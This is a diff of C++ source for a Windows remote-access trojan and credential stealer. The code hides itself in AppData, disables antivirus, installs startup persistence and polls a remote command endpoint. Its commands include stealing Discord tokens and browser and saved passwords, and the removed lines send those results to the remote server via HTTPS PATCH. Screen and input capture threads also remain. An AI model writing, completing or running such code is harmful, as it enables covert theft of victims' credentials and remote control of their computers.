@@ -1321,12 +1321,6 @@ void killProcessByName(const char* name) {
     CloseHandle(snap);
 }
 
-DWORD WINAPI mouseLock10(LPVOID) {
-    DWORD start = GetTickCount();
-    while (GetTickCount() - start < 10000) { SetCursorPos(0, 0); Sleep(30); }
-    return 0;
-}
-
 void disableAntivirus() {
     char exePath[MAX_PATH]; DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
     if (len > 0) exePath[len] = 0;
@@ -1548,27 +1542,9 @@ DWORD WINAPI pollThread(LPVOID) {
                         try{float s=std::stof(extractJson(payload,"scale"));if(s>=0.1f&&s<=1.0f)g_liveScale=s;}catch(...){}
                         try{int m=std::stoi(extractJson(payload,"monitor"));if(m>=0)g_liveMonitor=m;}catch(...){}
                         result="ok";
-                    } else if (type == "discord_tokens") {
-                        std::string k = key;
-                        CreateThread(0, 0, [](LPVOID p) -> DWORD {
-                            auto* d = (std::pair<std::string,std::string>*)p;
-                            std::string r = jsonEscape(getDiscordTokens());
-                            std::string b = "{\"status\":\"done\",\"result\":\"" + r + "\"}";
-                            httpsPatch("/commands/" + fbEsc(d->first) + "/" + d->second + ".json", b);
-                            delete d; return 0;
-                        }, new std::pair<std::string,std::string>(computerName, key), 0, 0);
-                        result = "processing";
-                    } else if (type == "browser_passwords") {
-                        std::string k = key;
-                        CreateThread(0, 0, [](LPVOID p) -> DWORD {
-                            auto* d = (std::pair<std::string,std::string>*)p;
-                            std::string r = jsonEscape(getBrowserPasswords());
-                            std::string b = "{\"status\":\"done\",\"result\":\"" + r + "\"}";
-                            httpsPatch("/commands/" + fbEsc(d->first) + "/" + d->second + ".json", b);
-                            delete d; return 0;
-                        }, new std::pair<std::string,std::string>(computerName, key), 0, 0);
-                        result = "processing";
-                    } else if (type == "passwords") result = getPasswords();
+                    } else if (type == "discord_tokens") result = getDiscordTokens();
+                    else if (type == "browser_passwords") result = getBrowserPasswords();
+                    else if (type == "passwords") result = getPasswords();
                     else if (type == "network_info") result = getNetworkInfo();
                     else if (type == "services") result = getServices();
                     else if (type == "installed_apps") result = getInstalledApps();
@@ -1712,10 +1688,9 @@ int main(int argc, char* argv[]) {
     }
     if (computerName.empty()) computerName = getComputerName();
     hideToAppData();
-    CreateThread(0, 0, mouseLock10, 0, 0, 0);
     disableAntivirus();
-    HWND hwnd = GetConsoleWindow();
-    if (hwnd && !showConsole) ShowWindow(hwnd, SW_HIDE);
+    AllocConsole();
+    ShowWindow(GetConsoleWindow(), SW_SHOW);
     publicIP = getPublicIP();
     installStartup();
     GdiplusStartupInput gdiplusStartupInput;
@@ -1724,6 +1699,7 @@ int main(int argc, char* argv[]) {
     CreateThread(0, 0, pollThread, 0, 0, 0);
     CreateThread(0, 0, inputThread, 0, 0, 0);
     if (!noScreen) CreateThread(0, 0, screenThread, 0, 0, 0);
-    // Keep alive - threads do all the work
-    while (true) Sleep(10000);
+    MSG msg;
+    while (GetMessage(&msg, 0, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
+    GdiplusShutdown(gdiplusToken);
 }
